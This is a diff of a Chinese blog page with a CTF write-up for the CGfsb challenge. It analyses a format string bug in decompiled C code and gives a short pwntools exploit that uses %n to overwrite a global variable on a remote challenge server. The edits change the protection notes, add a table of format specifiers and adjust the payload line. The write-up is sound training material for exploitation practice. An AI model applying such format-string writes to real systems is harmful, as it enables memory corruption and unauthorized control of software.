@@ -18,7 +18,7 @@
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://thriumph.top/CGCTF-CGfsb/1.png">
 <meta property="og:image" content="https://thriumph.top/CGCTF-CGfsb/2.png">
-<meta property="og:updated_time" content="2019-10-17T15:32:59.635Z">
+<meta property="og:updated_time" content="2019-10-18T07:20:41.052Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="CGCTF-CGfsb">
 <meta name="twitter:description" content="一道关于格式化字符串漏洞的题目">
@@ -198,13 +198,16 @@
         <p>一道关于格式化字符串漏洞的题目</p>
 <a id="more"></a>
 <p>关于格式化字符串漏洞可以参考一下之前写的文章<a href="https://thriumph.top/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E.html">https://thriumph.top/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E.html</a><br>呜呜呜，知识它不进脑子哇😭</p>
-<h1 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h1><p><img src="/CGCTF-CGfsb/1.png" alt><br>这是一个32位的elf文件，没有NX和canary保护，并且关闭了PIE地址随机化</p>
+<h1 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h1><p><img src="/CGCTF-CGfsb/1.png" alt><br>这是一个32位的elf文件，开启了NX和canary保护，关闭了PIE地址随机化，简单看了一下，要输入名字和留言内容。</p>
 <h1 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> buf; <span class="comment">// [esp+1Eh] [ebp-7Eh]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+22h] [ebp-7Ah]</span></span><br><span class="line">  __int16 v6; <span class="comment">// [esp+26h] [ebp-76h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+28h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// [esp+8Ch] [ebp-10h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  buf = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"please tell me your name:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">012u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"leave your message please:"</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">100</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"hello %s"</span>, &amp;buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"your message is:"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( pwnme == <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"you pwned me, here is your flag:\n"</span>);</span><br><span class="line">    system(<span class="string">"cat flag"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Thank you!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><strong>printf(&amp;s)</strong> 这是一个格式化字符串漏洞，只有当pwnme是8的时候，才会调用system(“cat flag”)，但是并没找到对pwnme赋值的操作。所以可以首先找到pwnme的地址，然后利用格式化字符串漏洞将pwnme地址写入8</p>
+<p><strong>printf(&amp;s)</strong> 正确的写法应该是printf(“%s”,s),这是一个格式化字符串漏洞，只有当pwnme是8的时候，才会调用system(“cat flag”)，但是并没找到对pwnme赋值的操作,所以可以首先找到pwnme的地址，然后利用格式化字符串漏洞用%n将pwnme地址写入8</p>
+<blockquote>
+<p>%d - 十进制 - 输出十进制整数<br>%s - 字符串 - 从内存中读取字符串<br>%x - 十六进制 - 输出十六进制数<br>%c - 字符 - 输出字符<br>%p - 指针 - 指针地址<br>%n - 到目前为止所写的字符数</p>
+</blockquote>
 <h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><h2 id="定位pwnme的地址"><a href="#定位pwnme的地址" class="headerlink" title="定位pwnme的地址"></a>定位pwnme的地址</h2><p>pwnme属于.bss段，是全局变量，没有开启pie保护，所以pwnme的地址是固定的<br>直接用ida查看：地址是0804A068<br>用odjdump查看：objdump -D 5 | grep pwnme</p>
 <h2 id="覆盖pwnme的地址"><a href="#覆盖pwnme的地址" class="headerlink" title="覆盖pwnme的地址"></a>覆盖pwnme的地址</h2><p>测一下偏移<br>在第二个printf函数处下断点gdb调试，确定输入的数据是栈中的第几个参数来确定偏移<br><img src="/CGCTF-CGfsb/2.png" alt><br>偏移为10</p>
-<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'111.198.29.45'</span>,<span class="string">'46016'</span>)</span><br><span class="line">p.send(<span class="string">'AAAA'</span>)</span><br><span class="line">pwnme = p32(<span class="number">0x0804A068</span>)</span><br><span class="line">p.send(pwnme+<span class="string">'AAAA%10$n'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'111.198.29.45'</span>,<span class="string">'46016'</span>)</span><br><span class="line">p.send(<span class="string">'AAAA'</span>)</span><br><span class="line">pwnme = p32(<span class="number">0x0804A068</span>)</span><br><span class="line">p.send(pwnme+<span class="string">'AAAA'</span>+<span class="string">'%10$n'</span>)<span class="comment">#pwnme是四位，需要用AAAA填充为8位，使pwnme为8</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 
       
@@ -532,11 +535,11 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">漏洞分析</a>
+                <a href="javascript:void(0)" class="js-tag color5">加密算法</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">加密算法</a>
+                <a href="javascript:void(0)" class="js-tag color5">漏洞分析</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -548,11 +551,11 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">pe文件</a>
+                <a href="javascript:void(0)" class="js-tag color4">DLL</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">DLL</a>
+                <a href="javascript:void(0)" class="js-tag color5">pe文件</a>
               </li>
              
               <li class="article-tag-list-item">
